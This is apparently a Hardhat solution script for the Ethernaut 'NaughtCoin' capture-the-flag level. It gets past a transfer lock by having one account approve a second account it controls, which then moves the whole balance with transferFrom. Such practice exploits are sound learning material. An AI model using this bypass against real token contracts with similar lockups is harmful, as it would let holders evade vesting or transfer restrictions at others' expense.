import { fail } from "assert";
import { ethers } from "hardhat";

ethers.utils.getAddress;

async function naughtCoinExploit() {
  const naughtCoinAddress = process.env.NAUGHT_COIN_ADDRESS || fail("NAUGHT_COIN_ADDRESS Not Found In .env");
  const naughtCoin = await ethers.getContractAt("NaughtCoin", naughtCoinAddress);
  const [attacker, attacker2] = await ethers.getSigners();

  const attackerAddr = await attacker.getAddress();
  const attacker2Addr = await attacker2.getAddress();

  const attackerBalance = await naughtCoin.balanceOf(attackerAddr);

  // approve other address to spend tokens
  let tx = await naughtCoin.connect(attacker).approve(attacker2Addr, attackerBalance);
  await tx.wait();

  // transfer all tokens using approved address
  tx = await naughtCoin.connect(attacker2).transferFrom(attackerAddr, attacker2Addr, attackerBalance);
  await tx.wait();

  console.log("Attacker balance after hack : ", await naughtCoin.balanceOf(attackerAddr));
  console.log(`SUCCESS!!! Submit the instance.`);
}

naughtCoinExploit().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
